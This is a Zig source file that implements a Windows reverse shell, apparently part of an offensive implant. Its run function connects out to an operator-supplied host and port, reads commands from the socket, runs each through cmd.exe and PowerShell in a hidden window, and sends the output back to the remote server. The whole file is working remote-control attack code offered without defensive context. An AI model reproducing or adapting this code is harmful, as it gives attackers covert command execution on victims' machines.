const std = @import("std");
const win = std.os.windows;
const CloseHandle = win.CloseHandle;
const CreatePipe = win.CreatePipe;
const CreateProcessW = win.CreateProcessW;
const HANDLE = win.HANDLE;
const HANDLE_FLAG_INHERIT = win.HANDLE_FLAG_INHERIT;
const LPWSTR = win.LPWSTR;
const PROCESS_INFORMATION = win.PROCESS_INFORMATION;
const ReadFile = win.ReadFile;
const SECURITY_ATTRIBUTES = win.SECURITY_ATTRIBUTES;
const SetHandleInformation = win.SetHandleInformation;
const STARTF_USESTDHANDLES = win.STARTF_USESTDHANDLES;
const STARTF_USESHOWWINDOW = win.STARTF_USESHOWWINDOW;
const STARTUPINFOW = win.STARTUPINFOW;
const TRUE = win.TRUE;
const W = std.unicode.utf8ToUtf16LeStringLiteral;
const WaitForSingleObject = win.WaitForSingleObject;
const WSAStartup = win.WSAStartup;
const WSASocketW = win.WSASocketW;
const ws2_32 = win.ws2_32;
const WSAConnect = ws2_32.WSAConnect;

const MAX_BUFFER_SIZE: usize = 2048;
const MAX_INPUT_BYTES: usize = 1024;
const MAX_OUTPUT_BYTES: usize = 4096;

fn readCommand(socket: std.net.Stream) !LPWSTR {
    const allocator = std.heap.page_allocator;

    var buf: [MAX_INPUT_BYTES]u8 = undefined;
    const buf_size = try socket.read(buf[0..]);
    if (buf_size == 0) return error.ServerClosed;

    const cmd_tmp = buf[0..buf_size]; // Remove last character ('\n')
    const cmd = try std.fmt.allocPrint(allocator, "/C powershell -nop {s}", .{cmd_tmp});
    defer allocator.free(cmd);

    // Convert u8 to u16
    var cmd_buf_w: [MAX_BUFFER_SIZE:0]u16 = undefined;
    const cmd_buf_w_length = try std.unicode.utf8ToUtf16Le(&cmd_buf_w, try allocator.dupe(u8, cmd));
    cmd_buf_w[cmd_buf_w_length] = 0; // Add null-terminated character.
    const cmd_w = @as(LPWSTR, @ptrCast(try allocator.dupe(u16, &cmd_buf_w)));
    return cmd_w;
}

fn readOutput(h_read_pipe: HANDLE) ![]u8 {
    const allocator = std.heap.page_allocator;
    var output = std.ArrayList(u8).init(allocator);
    defer output.deinit();

    var output_buf: [MAX_OUTPUT_BYTES]u8 = undefined;
    while (true) {
        const bytes_read = try ReadFile(h_read_pipe, &output_buf, 0);
        if (bytes_read == 0) break;

        try output.appendSlice(output_buf[0..bytes_read]);
    }
    return output.toOwnedSlice();
}

pub fn run(allocator: std.mem.Allocator, addr: []const u8, port: u16) !void {
    var socket = try std.net.tcpConnectToHost(allocator, addr, port);
    defer socket.close();

    const app_name = W("C:\\Windows\\System32\\cmd.exe");

    var sa = SECURITY_ATTRIBUTES{
        .nLength = @sizeOf(SECURITY_ATTRIBUTES),
        .bInheritHandle = 1,
        .lpSecurityDescriptor = null,
    };

    // Prepare handle to get the output.
    var h_read_pipe: HANDLE = undefined;
    var h_write_pipe: HANDLE = undefined;

    var output_stdout = std.ArrayList(u8).init(allocator);
    defer output_stdout.deinit();
    var output_stderr = std.ArrayList(u8).init(allocator);
    defer output_stderr.deinit();

    while (true) {
        output_stdout.clearRetainingCapacity();
        output_stderr.clearRetainingCapacity();

        const cmd_w = readCommand(socket) catch |err| {
            switch (err) {
                error.ServerClosed => break,
                else => continue,
            }
        };

        try CreatePipe(&h_read_pipe, &h_write_pipe, &sa);
        try SetHandleInformation(h_read_pipe, HANDLE_FLAG_INHERIT, 0);

        var si = STARTUPINFOW{
            .cb = @sizeOf(STARTUPINFOW),
            .lpReserved = null,
            .lpDesktop = null,
            .lpTitle = null,
            .dwX = 0,
            .dwY = 0,
            .dwXSize = 0,
            .dwYSize = 0,
            .dwXCountChars = 0,
            .dwYCountChars = 0,
            .dwFillAttribute = 0,
            .dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW,
            .wShowWindow = 0, // SW_HIDE
            .cbReserved2 = 0,
            .lpReserved2 = null,
            .hStdInput = null,
            .hStdOutput = h_write_pipe,
            .hStdError = h_write_pipe,
        };
        var pi: PROCESS_INFORMATION = undefined;

        // Execute the command.
        CreateProcessW(
            app_name,
            cmd_w,
            null,
            null,
            TRUE,
            0,
            null,
            null,
            &si,
            &pi,
        ) catch |err| {
            const alloc = std.heap.page_allocator;
            const error_message = try std.fmt.allocPrint(alloc, "error: {}\n", .{err});
            _ = try socket.write(error_message);
            continue;
        };

        CloseHandle(h_write_pipe);

        defer CloseHandle(pi.hThread);
        defer CloseHandle(pi.hProcess);

        const output = try readOutput(h_read_pipe);

        // Send the output to the server.
        if (output.len > 0) {
            _ = try socket.writeAll(output);
        } else {
            _ = try socket.writeAll("");
        }

        CloseHandle(h_read_pipe);

        try WaitForSingleObject(pi.hProcess, std.os.windows.INFINITE);
    }
}
